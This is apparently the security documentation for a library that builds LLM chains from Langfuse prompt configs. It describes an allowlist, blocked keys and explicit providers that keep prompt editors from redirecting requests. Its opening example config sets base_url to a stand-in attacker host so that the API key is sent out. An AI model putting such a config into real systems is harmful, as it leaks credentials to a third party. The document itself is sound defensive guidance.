# Security

Anyone who can edit a prompt in Langfuse controls its config, and the config becomes model
constructor arguments. Without guards, a prompt edit is a code change that skips the review:

```json
{"model": "gpt-5.5", "model_provider": "openai", "base_url": "https://attacker.example/v1"}
```

would send every request, with the API key in the header, to another host. Three guards keep that
from happening. Here is what each one does with that config.

## 1. Allowlist

By default only the keys in `DEFAULT_ALLOWED_CONFIG_KEYS` reach the model: the model, the provider
and the common sampling parameters such as `temperature`, `max_tokens`, `top_p`, `seed`,
`reasoning_effort` and `response_format`. `base_url` is not in it and is dropped.

Pass `allowed_config_keys` to narrow or widen the set, or `None` to pass every config key except
the blocked ones. Values are not validated: `n`, `max_tokens` and the reasoning budget set the
cost and the latency of a call, so narrow the set if the editors of the prompt should not control
them. Provider-specific switches such as `safety_settings` are not in the default set; add them
deliberately.

```python
factory = LangfuseChainFactory(
    langfuse,
    # Other config keys, such as "tools", do not reach the model. Hooks can still read them.
    allowed_config_keys={"model", "model_provider", "temperature", "max_tokens"},
)
```

## 2. Blocked keys

Endpoints, regions, projects, credentials, TLS settings, headers, proxies, transports, timeouts,
retries, HTTP clients, passthrough dicts such as `model_kwargs` and `extra_headers`, callbacks,
caches, `configurable_fields` and `config_prefix` are never taken from the config, whatever the
allowlist says. `base_url` is blocked even with `allowed_config_keys=None`.

The full rule is `is_blocked_config_key`. It is built from the constructor arguments of the known
provider packages and cannot be complete for every provider, so it is a second line of defense
behind the allowlist. `allowed_config_keys=None` relies on it alone and is meant for prompts that
only trusted people can edit: some models, `ChatOpenAI` among them, move unknown constructor
arguments into the request body, so the editors of the prompt control fields such as `store`,
`service_tier` and `metadata`.

## 3. Explicit providers

The provider is never inferred from the model name, and with `providers` set the config may select
only the providers the code configured, with the credentials the code gave them.
`{"model_provider": "ollama"}` against a factory that configured `openai` and `anthropic` raises
`ChainBuildError` and the previous chain keeps serving.

```python
factory = LangfuseChainFactory(
    langfuse,
    providers={
        "openai": {"api_key": os.environ["OPENAI_API_KEY"]},
        "anthropic": {"api_key": os.environ["ANTHROPIC_API_KEY"]},
    },
)
```

## Code beats config

A factory kwarg or a provider kwarg overrides the same key in the config, always. And the last
guard is in Langfuse itself: use a dedicated label for production and restrict who can move it.

Build errors are logged with the exception text, which may include config values. The model
constructor reports the values of the parameters it rejects, so a rejected credential passed
through the factory kwargs would appear in the log.
